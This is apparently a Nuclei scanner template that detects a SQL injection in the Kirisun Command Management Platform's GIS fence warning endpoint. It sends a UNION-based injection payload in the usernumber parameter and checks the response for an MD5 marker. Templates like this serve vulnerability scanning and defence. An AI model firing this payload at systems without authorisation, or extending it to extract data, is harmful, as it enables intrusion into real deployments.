id: kirisun-csmp-get-gis-fence-warning-sqli
info:
  name: Kirisun Command Management Platform GIS Fence Warning SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'

http:
  - raw:
      - |
        POST /api/client/get_gis_fence_warning.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        usernumber=1' UNION ALL SELECT NULL,NULL,CONCAT(0x7e,IFNULL(CAST(MD5({{t1}}) AS CHAR),0x7e),0x7e),NULL,NULL,NULL,NULL,NULL-- -
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"header\":"
          - "\"gis_wd\":"
          - "\"warning\":"
          - "{{t2}}"
      - type: word
        part: body
        words:
          - "<"
        negative: true
